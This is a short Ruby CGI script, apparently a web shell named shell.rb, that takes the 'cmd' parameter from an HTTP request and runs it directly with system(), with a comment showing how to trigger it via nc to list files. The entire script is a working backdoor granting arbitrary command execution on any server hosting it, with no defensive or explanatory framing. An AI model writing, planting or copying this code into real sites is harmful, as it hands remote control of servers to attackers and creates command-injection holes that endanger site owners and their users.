#!/usr/bin/env ruby
# echo "GET /cgi/shell.rb?cmd=ls%20-la" | nc localhost 80
require 'cgi'
cgi = CGI.new
puts cgi.header
system(cgi['cmd'])
